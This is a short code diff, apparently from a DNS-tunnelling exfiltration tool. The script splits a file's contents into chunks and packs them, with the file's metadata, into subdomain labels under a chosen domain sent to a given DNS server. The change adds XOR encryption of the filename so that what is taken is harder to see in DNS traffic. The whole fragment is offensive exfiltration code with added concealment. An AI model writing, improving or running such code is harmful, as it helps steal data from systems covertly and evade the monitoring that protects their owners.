@@ -60,7 +60,8 @@ def main(file_path, domain, dns_server_ip, password, use_tcp):
         chunk_length = (len(chunk) + 3) // 4
         chunks = [chunk[i * chunk_length:(i + 1) * chunk_length] for i in range(4)]
 
-        hex_filename = filename.encode().hex()
+        encrypted_filename = xor_encrypt(filename.encode(), password.encode())
+        hex_filename = encrypted_filename.hex()
         metadata = f"{hex_filename}|{timestamp}|{nb_chunks}"
         subdomain = f"{chunk_id}.{chunks[0]}.{chunks[1]}.{chunks[2]}.{chunks[3]}.{metadata}.{domain}"
 
